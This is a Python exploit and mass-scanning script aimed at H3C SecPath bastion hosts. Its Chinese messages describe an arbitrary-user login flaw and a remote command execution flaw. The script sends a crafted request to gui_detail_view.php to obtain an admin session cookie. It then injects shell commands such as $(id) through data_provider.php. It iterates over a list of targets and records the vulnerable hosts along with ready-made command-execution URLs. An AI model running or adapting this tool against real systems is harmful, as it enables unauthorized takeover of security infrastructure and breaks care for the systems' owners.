import requests,re,sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
#url="https://59.83.223.254"
def h3c(url):
    try:
        url1=url+"/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin"
        res1=requests.get(url1,verify=False,timeout=5)
        #print(res1.headers)
        if '错误的id' in res1.content.decode('utf-8'):
            print("--------------存在H3C SecParh堡垒机 get_detail_view.php 任意用户登录漏洞----------------")
            a=res1.headers['Set-Cookie']
            #print(a)
            cookie=re.sub('; path=/; HttpOnly','',a)
            #print(cookie)
            headers={'Cookie':cookie}
            url2=url+"/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(echo qudqdgqdfdewds11)&identity_cond=&query_type=all&format=json&browse=true"
            res2=requests.get(url2,verify=False,headers=headers,timeout=10)
            #print(res2.text)
            if b'qudqdgqdfdewds11' in res2.content and b'echo' not in res2.content:
                #b=re.findall('service=(.*?)\"',str(res2.content.decode('utf-8')))
                print("------------存在H3C SecParh堡垒机 data_provider.php 远程命令执行漏洞---------------")
                print("shell地址：")
                print("先访问获取cookie： "+url1)
                print("再访问执行id命令： "+url+"/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true")
                with open('success.txt', 'a') as g:
                    g.write(url+'\n'+"------------存在H3C SecParh堡垒机 data_provider.php 远程命令执行漏洞---------------"+'\n'+"shell地址："+'\n'+"先访问获取cookie： "+url1+'\n'+"再访问执行id命令： "+url+"/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true"+'\n\n')
            else:
                print(url + "不存在H3C SecParh堡垒机 data_provider.php 远程命令执行漏洞")
        else:
            print(url + "不存在H3C SecParh堡垒机 data_provider.php 远程命令执行漏洞")
    except Exception as e:
        print(url+"不存在H3C SecParh堡垒机 data_provider.php 远程命令执行漏洞")
        print(e)

if '__main__'==__name__:
    if len(sys.argv) != 3:
        print("---------------------------------------------")
        print("python h3c.py -t url.txt")
        print("python h3c.py -u url")
        print("---------------------------------------------")
    else:
        z = sys.argv[1]
        r = sys.argv[2]
        if z=='-u':
            if 'http' not in r:
                r = 'http://' + r
            e = re.split('/', r)
            h = e[0] + '//' + e[1] + e[2]
            print(h)
            h3c(h)
        elif z=='-t':

            with open(r,'r') as f:
                p=f.readlines()
                for i in p:
                    d=re.sub('\n','',str(i))
                    #print(d)
                    if 'http' not in d:
                        d='http://'+d
                    e=re.split('/',d)
                    h=e[0]+'//'+e[1]+e[2]
                    print(h)
                    h3c(h)
        else:
            print("---------------------------------------------")
            print("python h3c.py -t url.txt")
            print("python h3c.py -u url")
            print("---------------------------------------------")